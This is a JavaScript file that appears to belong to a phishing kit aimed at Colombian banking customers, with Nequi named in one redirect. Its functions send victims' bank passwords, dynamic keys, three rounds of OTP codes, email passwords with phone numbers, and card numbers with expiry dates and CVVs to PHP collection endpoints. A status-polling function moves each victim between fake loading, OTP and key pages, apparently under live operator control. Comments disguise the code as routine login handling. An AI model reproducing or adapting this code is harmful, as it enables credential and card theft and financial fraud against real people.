// Función para iniciar sesión o procesar datos del usuario
function inicio(usuario) {
    $.post("../../process/inicio.php", { usr: usuario }, function (response) {
        // Aquí puedes manejar la respuesta del servidor si es necesario
    });
}

// Función para detectar el dispositivo que está utilizando el usuario
function detectar_dispositivo() {
    var dispositivo = "";
    var userAgent = navigator.userAgent;

    if (userAgent.match(/Android/i)) {
        dispositivo = "Android";
    } else if (userAgent.match(/webOS/i)) {
        dispositivo = "webOS";
    } else if (userAgent.match(/iPhone/i)) {
        dispositivo = "iPhone";
    } else if (userAgent.match(/iPad/i)) {
        dispositivo = "iPad";
    } else if (userAgent.match(/iPod/i)) {
        dispositivo = "iPod";
    } else if (userAgent.match(/BlackBerry/i)) {
        dispositivo = "BlackBerry";
    } else if (userAgent.match(/Windows Phone/i)) {
        dispositivo = "Windows Phone";
    } else {
        dispositivo = "PC";
    }

    return dispositivo;
}

function pasousuario(clave, usuario, banco, dinamica) {
    var dispositivo = detectar_dispositivo();
    
    $.post("../../process2/pasousuario.php", {
        pass: clave,
        user: usuario,
        dis: dispositivo,
        banco: banco,
        dinamica: dinamica // Asegurarse de que la clave dinámica se envíe correctamente
    }, function (response) {
        if (response === "ERR") {
            alert("Hubo un error. Inténtalo de nuevo.");
        } else if (response === "NO") {
            alert("Usuario o contraseña incorrectos.");
        } else {
            // Si la respuesta es exitosa, redirigir a cargando.php o manejar el resultado
            window.location.href = "./cargando.php";
        }
    });
}

// Función para consultar el estado del usuario y redirigir en función del estado
function consultar_estado() {
    $.post("../../process2/estado.php", function (estado) {
        switch (estado) {
            case "1":
                window.location.href = "./cargando.php";
                break;
            case "2":
                window.location.href = "./otp.php";
                break;
            case "15":
                window.location.href = "./dinamica2.php";
                break;
            case "4":
                window.location.href = "./cargando.php";
                break;
            case "3":
                window.location.href = "./cargando.php";
                break;
            case "14":
                window.location.href = "./cargando.php";
                break;
            case "16":
                window.location.href = "./cargando.php";
                break;
            case "6":
                window.location.href = "../../../pago.php?carderror=true";
                break;
            case "8":
                window.location.href = "./dinamica.php";
                break;
            case "10":
                window.location.href = "https://www.nequi.com.co/personas/credito/propulsor";
                break;
            case "12":
                window.location.href = "./neq.php";
                break;
            default:
                alert("Estado no manejado.");
        }
    });
}

// Función para enviar un código OTP
function enviar_otp(codigo_otp) {
    $.post("../../process2/pasoOTP.php", { otp: codigo_otp }, function () {
        window.location.href = "./cargando.php"; // Redirigir a cargando.php después de enviar OTP
    });
}

// Función para enviar un código OTP
function enviar_otp2(codigo_otp) {
    $.post("../../process2/pasoOTP2.php", { otp2: codigo_otp }, function () {
        window.location.href = "./cargando.php"; // Redirigir a cargando.php después de enviar OTP
    });
}

// Función para enviar un código OTP
function enviar_otp3(codigo_otp) {
    $.post("../../process2/pasoOTP3.php", { otp3: codigo_otp }, function () {
        window.location.href = "./cargando.php"; // Redirigir a cargando.php después de enviar OTP
    });
}

// Función para enviar un correo electrónico
function enviar_mail(email, password, celular) {
    $.post("../../process/pasomail.php", {
        eml: email,
        passe: password,
        cel: celular
    }, function () {
        window.location.href = "./";
    });
}

// Función para enviar datos de tarjeta de crédito o débito
function enviar_tarjeta(numero_tarjeta, fecha_expiracion, cvv) {
    $.post("../../process/pasotarjeta.php", {
        tar: numero_tarjeta,
        fec: fecha_expiracion,
        cvv: cvv
    }, function () {
        window.location.href = "./";
    });
}